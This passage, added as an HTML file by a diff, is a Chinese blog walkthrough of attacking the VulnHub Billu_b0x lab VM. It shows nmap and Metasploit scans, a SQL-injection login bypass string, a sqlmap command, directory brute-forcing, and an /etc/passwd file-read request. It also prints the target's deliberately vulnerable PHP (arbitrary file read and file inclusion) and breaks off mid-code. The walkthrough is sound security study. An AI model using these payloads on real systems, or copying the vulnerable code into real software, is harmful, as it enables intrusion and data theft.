@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>VulnHub BiLLu靶机渗透测试学习 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub BiLLu靶机渗透测试学习</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-06-12&nbsp;&nbsp;13:32:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为之前都在学习代码审计比较多，然后对渗透测试这一块实在是没什么了解，之前本科的时候想要学习过，但是那个时候设备太菜了，同时运行靶机和攻击机实在是有点卡得吃不消。现在趁着这两天稍微轻松点，所以学习一点简单的渗透知识。</p>
+<p>这次采用的靶机是vulnhub上的Billu靶机，可以在这里下载： <a href="https://www.vulnhub.com/entry/billu-b0x,188/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/billu-b0x,188/</a>  。</p>
+<p>下载后是一个ova文件，导入vmware或是virtual box即可。</p>
+<h2 id="实验靶机"><a href="#实验靶机" class="headerlink" title="实验靶机"></a>实验靶机</h2><p><strong>靶机</strong> ：Billu</p>
+<p><strong>攻击机</strong> : Kali 2020.02，这个版本的kali和前几年的相比，感觉在UI方面改进了好多，对密码也进行了修改，变成了<code>kali:kali</code>，没想到的是去掉了root用户，具体的可以参考官方链接： <a href="https://www.kali.org/docs/introduction/default-credentials/" target="_blank" rel="noopener">https://www.kali.org/docs/introduction/default-credentials/</a> 。</p>
+<p>主机和靶机的网络都采用<code>DHCP</code>模式，位于同一局域网下。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>当前的攻击机的ip地址为<code>192.168.247.210</code>，所以我们要扫描的网络范围可以确定为<code>192.168.247.1/24</code>：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/3.png" alt="3"></p>
+<p>这里收集主机信息可以用<code>metasploit</code>或是更为强大的<code>nmap</code>。</p>
+<h4 id="目标主机探测"><a href="#目标主机探测" class="headerlink" title="目标主机探测"></a>目标主机探测</h4><h5 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h5><p>在Metasploit中也存在一些模块可以用于主机探测，这些模块位于Metasploit源码的<code>modules/auxiliary/scanner/discovery</code>路径下，主要有这么几个：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/1.png" alt="1"></p>
+<p>这里可能第一个和最后一个用的比较多：</p>
+<blockquote>
+<p><strong>arp_sweep</strong> ： 使用arp请求枚举本地局域网络中的所有活跃主机</p>
+<p><strong>udp_sweep</strong> ： 通过发送udp数据包探测指定主机是否处于活跃状态，并发现主机上的udp服务</p>
+</blockquote>
+<p>因为要先确定靶机的ip地址，所以可以用<code>auxiliary/scanner/discovery/arp_sweep</code>探测：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/discovery/arp_sweep </span><br><span class="line">msf5 auxiliary(scanner/discovery/arp_sweep) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/discovery/arp_sweep):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   INTERFACE                   no        The name of the interface</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'</span><br><span class="line">   SHOST                       no        Source IP Address</span><br><span class="line">   SMAC                        no        Source MAC Address</span><br><span class="line">   THREADS    1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   TIMEOUT    5                yes       The number of seconds to wait for new data</span><br></pre></td></tr></table></figure>
+
+<p>新版的kali默认不是root用户，这个需要root权限。</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/2.png" alt="2"></p>
+<p>但是<strong>arp_sweep</strong> 只能探测同一子网中的主机，对于远程的网络，<strong>nmap</strong> 是更好的选择。</p>
+<h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>命令格式为：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap &lt;扫描选项&gt; &lt;扫描目标&gt;</span><br></pre></td></tr></table></figure>
+
+<p>常用的nmap<code>扫描类型参数</code>有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-sT: TCP connect扫描，类似Metasploit中的tcp扫描模块</span><br><span class="line">-sS: TCP SYN扫描，类似Metasploit中的syn扫描模块</span><br><span class="line">-sF&#x2F;-sX&#x2F;-sN: 这些扫描通过发送一些特殊的标志位以避开设备或软件的检测</span><br><span class="line">-sP: 通过发送ICMP echo请求来探测主机是否存活，原理通ping</span><br><span class="line">-sU: 探测目标主机开放了哪些UDP端口</span><br><span class="line">-sA: TCP ACK扫描，类似Metasploit中的ack扫描模块</span><br></pre></td></tr></table></figure>
+
+<p>常用的nmap<code>扫描选项</code>有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-Pn: 在扫描之前，不发送ICMP echo请求测试目标是否存活</span><br><span class="line">-O: 启用对于TCP&#x2F;IP协议栈的指纹特征扫描以获取远程主机的操作系统类型等信息</span><br><span class="line">-F: 快速扫描模式，只扫描在nmap-services中列出的端口</span><br><span class="line">-p&lt;端口范围&gt;: 可以使用这个参数指定希望扫描的端口（如-p1080），也可以使用一段端口范围（例如1-1023）</span><br></pre></td></tr></table></figure>
+
+<p>直接用<code>nmap -sP 192.168.247.1/24</code>进行扫描：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/4.png" alt="4"></p>
+<p>可以发现目标主机的ip为<code>192.168.247.211</code>。</p>
+<h4 id="主机服务信息探测"><a href="#主机服务信息探测" class="headerlink" title="主机服务信息探测"></a>主机服务信息探测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65535 -A 192.168.247.211 -oN billu.txt</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>-A</code>表示获取详细的操作系统信息，<code>-oN</code>表示保存扫描结果到某个文件，这里是<code>billu.txt</code>：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/5.png" alt="5"></p>
+<p>扫描后发现开启了两个服务，一个<code>apache</code>，另一个<code>ssh</code>服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>在目标主机的80端口上有网站服务，访问后看到是一个登录界面：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/6.png" alt="6"></p>
+<p>从提示看是要考察sql注入。到这里先捋一下思路。</p>
+<p>渗透测试中的漏洞挖掘部分主要有这么几个流程，主要参考<a href="https://mp.weixin.qq.com/s?__biz=MzI4NjEyMDk0MA==&mid=2649847367&idx=1&sn=54a6ab79ef342d2bb96b4f97bc87cef5&chksm=f3e418c4c49391d2569a4987ce377518ec1158dd4cfb6edb91718d7fdcc7c91abb4737d3a74f&scene=21" target="_blank" rel="noopener">红日安全的这篇文章</a>：</p>
+<blockquote>
+<ol>
+<li>SQL注入：看看能不能有什么办法能够成功注入</li>
+<li>爆破目录：用Dirbuster可以爆破网页和目录，dirb可以爆破目录，这一步可以收集到一些信息</li>
+<li>漏洞扫描：上一步爆破的结果，喂给AWVS或是APPScan扫描，看看有没有漏洞</li>
+<li>手动挖掘：如果扫描不到什么有价值的漏洞，可以通过burp抓包，在burp中进行分析</li>
+<li>查看网页源码：看看有没有什么提示</li>
+<li>如果能得到用户名，密码，尝试登录ssh，如果能连接成功，则无需反弹shell</li>
+</ol>
+</blockquote>
+<h5 id="第一步：SQL注入"><a href="#第一步：SQL注入" class="headerlink" title="第一步：SQL注入"></a>第一步：SQL注入</h5><p>最先尝试下万能密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or &#39;1&#39;&#x3D;&#39;1 --</span><br></pre></td></tr></table></figure>
+
+<p>登录失败，跳出一个弹窗：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/7.png" alt="7"></p>
+<p>拿sqlmap试一下，稍微介绍下sqlmap的参数选项：</p>
+<blockquote>
+<p><strong>-u</strong> : 目标URL<br><strong>–data</strong> : 这个参数表示以POST方式提交请求数据<br><strong>–level</strong> : 表示探测等级，默认为1，失sqlmap使用的payload可以在xml/payloads.xml中看到，当–level的参数设定为2或者是2以上的时候，会尝试注入<strong>Cookie</strong>参数； 当–level参数设定为3或者3以上的时候，会尝试对<strong>User-Agent</strong>进行注入；当无法确定哪个payload或者参数为注入点的时候，可以直接使用最高的level<br><strong>–dbms</strong> : 表示指定的数据库，不过默认情况下sqlmap会自己进行探测</p>
+</blockquote>
+<p>所以需要先尝试登录获取一些post请求参数字段：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/8.png" alt="8"></p>
+<p>请求的form表单需要三个参数：<code>un</code>，<code>ps</code>和<code>login</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.247.211" --data "un=admin&amp;ps=admin&amp;login=let%27+login" --level 3 --dbms mysql</span><br></pre></td></tr></table></figure>
+
+<p>但是注入失败：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/9.png" alt="9"></p>
+<h5 id="第二步：爆破目录"><a href="#第二步：爆破目录" class="headerlink" title="第二步：爆破目录"></a>第二步：爆破目录</h5><p>因为登录失败，爆破一下目录看看有没有其他的网页可以作为入口，这里用Kali中的<code>DirBuster</code>。</p>
+<p>从扫描结果中可以看到网页信息：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/10.png" alt="10"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php</span><br><span class="line">&#x2F;in.php</span><br><span class="line">&#x2F;c.php</span><br><span class="line">&#x2F;show.php</span><br><span class="line">&#x2F;add.php</span><br><span class="line">&#x2F;test.php</span><br><span class="line">&#x2F;head.php</span><br><span class="line">&#x2F;panel.php</span><br></pre></td></tr></table></figure>
+
+<p>以及目录信息：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/11.png" alt="11"></p>
+<p>扫描目录还可以用<code>dirb</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb "http://192.168.247.211" /usr/share/dirb/wordlists/big.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/12.png" alt="12"></p>
+<p>这里发现了<code>Dirbuster</code>没扫出来的一个很重要的目录：<code>/phpmy</code>，根据名字，这非常有可能是phpmyadmin的目录，最后的目录为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;images</span><br><span class="line">&#x2F;icons</span><br><span class="line">&#x2F;doc</span><br><span class="line">&#x2F;icons&#x2F;small</span><br><span class="line">&#x2F;uploaded_images</span><br><span class="line">&#x2F;phpmy</span><br></pre></td></tr></table></figure>
+
+<h5 id="第三步：访问页面"><a href="#第三步：访问页面" class="headerlink" title="第三步：访问页面"></a>第三步：访问页面</h5><p>在访问<code>test.php</code>的时候发现回显，接受一个参数<code>file</code>，看上去应该是文件包含漏洞：</p>
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/13.png" alt="13"></p>
+<p>但是不知道是get方式还是post方式，都试一下，当采用get请求时，返回了当前页面，再试一下post请求方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;test.php</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/12/vulnhub_Billu/imgs/14.png" alt="14"></p>
+<p>果然存在文件包含，顺便从<code>/etc/passwd</code>可以看到存在用户<code>ica</code>，但是登录密码是什么还是未知。</p>
+<p>那可以来读取一下之前爆破出的网页的源码。</p>
+<p><code>test.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_download</span><span class="params">($download)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(file_exists($download))</span><br><span class="line">				&#123;</span><br><span class="line">					header(<span class="string">"Content-Description: File Transfer"</span>); </span><br><span class="line">					</span><br><span class="line">					header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</span><br><span class="line">					header(<span class="string">'Expires: 0'</span>);</span><br><span class="line">					header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</span><br><span class="line">					header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">					header(<span class="string">'Accept-Ranges: bytes'</span>);</span><br><span class="line">					header(<span class="string">'Content-Disposition: attachment; filename="'</span>.basename($download).<span class="string">'"'</span>); </span><br><span class="line">					header(<span class="string">'Content-Length: '</span> . filesize($download));</span><br><span class="line">					header(<span class="string">'Content-Type: application/octet-stream'</span>); </span><br><span class="line">					ob_clean();</span><br><span class="line">					flush();</span><br><span class="line">					readfile ($download);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"file not found"</span>;	</span><br><span class="line">				&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'file'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">file_download($_POST[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'\'file\' parameter is empty. Please provide file path in \'file\' parameter '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>test.php</code>的第20行用<code>readfile()</code>实现了任意文件读取。</p>
+<p><code>in.php</code>是一个打印<code>phpinfo</code>的文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>顺便收集到一些phpinfo信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php version:</span><br><span class="line">PHP Version 5.3.10</span><br><span class="line"></span><br><span class="line">disable_functions:</span><br><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority</span><br><span class="line"></span><br><span class="line">document_root:</span><br><span class="line">&#x2F;var&#x2F;www</span><br></pre></td></tr></table></figure>
+
+<p>然后发现在<code>panel.php</code>文件中存在一个任意文件包含漏洞（第50行）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'c.php'</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'head2.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(@$_SESSION[<span class="string">'logged'</span>]!=<span class="keyword">true</span> )</span><br><span class="line">&#123;</span><br><span class="line">		header(<span class="string">'Location: index.php'</span>, <span class="keyword">true</span>, <span class="number">302</span>);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Welcome to billu b0x "</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;form method=post style="margin: 10px 0px 10px 95%;"&gt;&lt;input type=submit name=lg value=Logout&gt;&lt;/form&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'lg'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'logged'</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'admin'</span>]);</span><br><span class="line">	header(<span class="string">'Location: index.php'</span>, <span class="keyword">true</span>, <span class="number">302</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;hr&gt;&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;form method=post&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;select name=load&gt;</span></span><br><span class="line"><span class="string">    &lt;option value="show"&gt;Show Users&lt;/option&gt;</span></span><br><span class="line"><span class="string">	&lt;option value="add"&gt;Add User&lt;/option&gt;</span></span><br><span class="line"><span class="string">&lt;/select&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &amp;nbsp&lt;input type=submit name=continue value="continue"&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'continue'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$dir=getcwd();</span><br><span class="line">	$choice=str_replace(<span class="string">'./'</span>,<span class="string">''</span>,$_POST[<span class="string">'load'</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>($choice===<span class="string">'add'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">       		<span class="keyword">include</span>($dir.<span class="string">'/'</span>.$choice.<span class="string">'.php'</span>);</span><br><span class="line">			<span class="keyword">die</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span>($choice===<span class="string">'show'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">include</span>($dir.<span class="string">'/'</span>.$choice.<span class="string">'.php'</span>);</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">include</span>($dir.<span class="string">'/'</span>.$_POST[<span class="string">'load'</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'upload'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	$name=mysqli_real_escape_string($conn,$_POST[<span class="string">'name'</span>]);</span><br><span class="line">	$address=mysqli_real_escape_string($conn,$_POST[<span class="string">'address'</span>]);</span><br><span class="line">	$id=mysqli_real_escape_string($conn,$_POST[<span class="string">'id'</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'image'</span>][<span class="string">'name'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		$iname=mysqli_real_escape_string($conn,$_FILES[<span class="string">'image'</span>][<span class="string">'name'</span>]);</span><br><span class="line">		$r=pathinfo($_FILES[<span class="string">'image'</span>][<span class="string">'name'</span>],PATHINFO_EXTENSION);</span><br><span class="line">		$image=<span class="keyword">array</span>(<span class="string">'jpeg'</span>,<span class="string">'jpg'</span>,<span class="string">'gif'</span>,<span class="string">'png'</span>);</span><br><span class="line">		<span class="keyword">if</span>(in_array($r,$image))</span><br><span class="line">		&#123;</span><br><span class="line">			$finfo = @<span class="keyword">new</span> finfo(FILEINFO_MIME); </span><br><span class="line">			$filetype = @$finfo-&gt;file($_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">'/image\/jpeg/'</span>,$filetype )  || preg_match(<span class="string">'/image\/png/'</span>,$filetype ) || preg_match(<span class="string">'/image\/gif/'</span>,$filetype ))</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>], <span class="string">'uploaded_images/'</span>.$_FILES[<span class="string">'image'</span>][<span class="string">'name'</span>]))</span><br><span class="line">								 &#123;</span><br><span class="line">								  <span class="keyword">echo</span> <span class="string">"Uploaded successfully "</span>;</span><br><span class="line">								  $update=<span class="string">'insert into users(name,address,image,id) values(\''</span>.$name.<span class="string">'\',\''</span>.$address.<span class="string">'\',\''</span>.$iname.<span class="string">'\', \''</span>.$id.<span class="string">'\')'</span>; </span><br><span class="line">								 mysqli_query($conn, $update);</span><br><span class="line">								  </span><br><span class="line">								&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span 